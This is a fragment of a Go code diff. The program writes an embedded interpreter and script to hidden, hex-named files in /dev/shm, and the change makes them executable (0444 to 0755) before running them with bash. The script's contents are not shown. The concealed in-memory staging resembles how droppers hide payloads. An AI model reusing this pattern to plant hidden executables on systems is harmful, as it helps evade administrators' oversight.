@@ -20,16 +20,16 @@ var script []byte
 
 func main() {
     intPath := fmt.Sprintf("%s/b1eb1d986eae58028aa64530ed287c5a3c2c5caf4225247f6cd0d0c5ba79fd3e42716fda1603ec5d2ed452f1045a23bd2922f52ad29ee3c8b12e541ee835b3d6", "/dev/shm/.b1eb1d986eae58028aa64530ed287c5a3c2c5caf4225247f6cd0d0c5ba79fd3e42716fda1603ec5d2ed452f1045a23bd2922f52ad29ee3c8b12e541ee835b3d6")
-    os.MkdirAll(filepath.Dir(intPath), 0444)
-    errEmbedInt := os.WriteFile(intPath, interpreter, 0444)
+    os.MkdirAll(filepath.Dir(intPath), 0755)
+    errEmbedInt := os.WriteFile(intPath, interpreter, 0755)
     if errEmbedInt != nil {
         log.Fatalf("Failed to write embedded interpreter: %v", errEmbedInt)
     }
     // defer os.Remove(intPath)
 
     tmpPath := fmt.Sprintf("%s/b1eb1d986eae58028aa64530ed287c5a3c2c5caf4225247f6cd0d0c5ba79fd3e42716fda1603ec5d2ed452f1045a23bd2922f52ad29ee3c8b12e541ee835b3d6", "/dev/shm/.67eddf7968bbfbdfd9d9a52b7e2109e239dcef4e9a2efcc84bb367a1d1246014e490097df63694301e1bf127b03e42784fbbcb2ae3d57adf25ab7513635331e2/")
-    os.MkdirAll(filepath.Dir(tmpPath), 0444)
-    errEmbed := os.WriteFile(tmpPath, script, 0444)
+    os.MkdirAll(filepath.Dir(tmpPath), 0755)
+    errEmbed := os.WriteFile(tmpPath, script, 0755)
     if errEmbed != nil { log.Fatalf("Failed to write embedded script: %v", errEmbed) }
 
     interp := "bash"
